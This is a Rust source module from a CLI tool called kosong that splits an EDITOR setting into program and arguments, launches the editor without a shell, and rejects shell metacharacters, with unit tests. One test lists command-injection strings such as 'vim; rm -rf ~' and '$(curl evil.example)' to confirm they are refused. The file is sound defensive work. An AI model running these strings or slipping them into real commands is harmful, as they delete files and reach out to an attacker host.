//! Opening the user's editor, without a shell.
//!
//! FR-2 requires that `kosong edit` "opens the configured editor safely; never
//! invokes a shell command string", and §12.1 forbids `sh -c` and friends
//! outright.
//!
//! # Why this is not just `Command::new(editor_string)`
//!
//! Editors are commonly configured with arguments — `code --wait`,
//! `subl -n -w`. Treating the whole string as one executable name would break
//! every one of those. So the string is split on whitespace into a program and
//! leading arguments.
//!
//! That split is **not** shell parsing. There is no quote handling, no
//! variable expansion, no globbing, and no operator interpretation. A value
//! like `vim; rm -rf ~` does not run two commands, because nothing here can
//! run two commands.
//!
//! Rather than pass such a value through as a set of literal arguments — which
//! would be safe but baffling, as the editor opened files named `;` and `rm` —
//! [`EditorCommand::parse`] rejects shell metacharacters with an explanation.
//! Safe *and* comprehensible beats safe alone.

use crate::exit::{CliError, CliResult, Exit};
use camino::Utf8Path;
use std::process::Command;

/// Characters that only mean something to a shell.
///
/// Their presence means the user expected shell behaviour that `kosong` will
/// not provide, so it is clearer to say so than to pass them through.
const SHELL_METACHARACTERS: [char; 12] =
    [';', '&', '|', '$', '`', '>', '<', '(', ')', '\n', '\r', '*'];

/// An editor to launch: one executable plus fixed leading arguments.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct EditorCommand {
    pub program: String,
    pub args: Vec<String>,
}

impl EditorCommand {
    /// Parses an editor setting.
    ///
    /// Returns `Err` when the value contains shell syntax, and `Ok(None)` when
    /// it is empty.
    pub fn parse(setting: &str) -> CliResult<Option<Self>> {
        let setting = setting.trim();
        if setting.is_empty() {
            return Ok(None);
        }

        if let Some(found) = setting.chars().find(|c| SHELL_METACHARACTERS.contains(c)) {
            return Err(CliError::usage(
                "EDITOR_NOT_A_SHELL_COMMAND",
                format!("the editor setting contains `{found}`, which kosong cannot use"),
            )
            .with_repair(
                "kosong runs your editor directly rather than through a shell, so it cannot \
                 use shell features like `;`, `|`, or `$`.\n\
                 Set it to just the editor and its options, for example:\n  \
                 export EDITOR=\"code --wait\"",
            ));
        }

        let mut parts = setting.split_whitespace().map(str::to_owned);
        let program = parts.next().expect("non-empty after trim");
        Ok(Some(Self {
            program,
            args: parts.collect(),
        }))
    }

    /// Opens `file`, waiting for the editor to exit.
    ///
    /// Standard input, output, and error are inherited so terminal editors
    /// such as `vim` and `nano` work normally.
    pub fn launch(&self, file: &Utf8Path) -> CliResult<()> {
        // Executable and arguments are separate values. No string is ever
        // handed to a shell for interpretation.
        let status = Command::new(&self.program)
            .args(&self.args)
            .arg(file.as_str())
            .status()
            .map_err(|e| {
                let program = &self.program;
                if e.kind() == std::io::ErrorKind::NotFound {
                    CliError::new(
                        Exit::Provider,
                        "EDITOR_NOT_FOUND",
                        format!("could not find an editor called `{program}`"),
                    )
                    .with_repair(format!(
                        "Check that `{program}` is installed and spelled correctly, or pick \
                         another editor:\n  kosong edit --editor nano"
                    ))
                } else {
                    CliError::new(
                        Exit::Provider,
                        "EDITOR_LAUNCH_FAILED",
                        format!("could not start `{program}`: {e}"),
                    )
                }
            })?;

        if !status.success() {
            let program = &self.program;
            // A non-zero editor exit usually means the user quit without
            // saving, which is not a kosong failure worth an error exit.
            return Err(CliError::new(
                Exit::Provider,
                "EDITOR_EXITED_NONZERO",
                format!("`{program}` closed without saving"),
            )
            .with_repair("Nothing was changed. Run `kosong edit` again when you are ready."));
        }
        Ok(())
    }

    /// The command as it would be typed, for `--dry-run` style output.
    pub fn display(&self, file: &Utf8Path) -> String {
        let mut parts = vec![self.program.clone()];
        parts.extend(self.args.iter().cloned());
        parts.push(file.to_string());
        parts.join(" ")
    }
}

/// Explains that no editor could be found.
pub fn no_editor_error() -> CliError {
    CliError::usage("NO_EDITOR", "kosong does not know which editor to open").with_repair(
        "Tell it once, by setting EDITOR in your shell:\n  \
         export EDITOR=nano\n\
         Or choose one just for this command:\n  \
         kosong edit --editor nano",
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_bare_editor_name_parses() {
        let parsed = EditorCommand::parse("nano").unwrap().unwrap();
        assert_eq!(parsed.program, "nano");
        assert!(parsed.args.is_empty());
    }

    #[test]
    fn an_editor_with_options_parses() {
        let parsed = EditorCommand::parse("code --wait --new-window")
            .unwrap()
            .unwrap();
        assert_eq!(parsed.program, "code");
        assert_eq!(parsed.args, vec!["--wait", "--new-window"]);
    }

    #[test]
    fn surrounding_whitespace_is_ignored() {
        let parsed = EditorCommand::parse("  vim   -n  ").unwrap().unwrap();
        assert_eq!(parsed.program, "vim");
        assert_eq!(parsed.args, vec!["-n"]);
    }

    #[test]
    fn an_empty_setting_is_not_an_editor() {
        assert_eq!(EditorCommand::parse("").unwrap(), None);
        assert_eq!(EditorCommand::parse("   ").unwrap(), None);
    }

    #[test]
    fn shell_syntax_is_refused_with_an_explanation() {
        // None of these could execute, because nothing here invokes a shell.
        // They are refused so the user learns why their setting will not work,
        // rather than watching their editor open a file named `;`.
        for hostile in [
            "vim; rm -rf ~",
            "vim && curl evil.example",
            "vim | tee /tmp/x",
            "$(curl evil.example)",
            "vim `whoami`",
            "vim > /etc/passwd",
            "vim\nrm -rf ~",
            "vim *",
        ] {
            let err =
                EditorCommand::parse(hostile).expect_err(&format!("`{hostile}` must be refused"));
            assert_eq!(err.code, "EDITOR_NOT_A_SHELL_COMMAND");
            assert!(
                err.repair
                    .unwrap()
                    .contains("directly rather than through a shell")
            );
        }
    }

    #[test]
    fn an_absolute_path_is_accepted() {
        let parsed = EditorCommand::parse("/usr/local/bin/micro")
            .unwrap()
            .unwrap();
        assert_eq!(parsed.program, "/usr/local/bin/micro");
    }

    #[test]
    fn the_file_is_always_the_final_argument() {
        let parsed = EditorCommand::parse("code --wait").unwrap().unwrap();
        let shown = parsed.display(Utf8Path::new("/tmp/kosong.md"));
        assert_eq!(shown, "code --wait /tmp/kosong.md");
    }
}
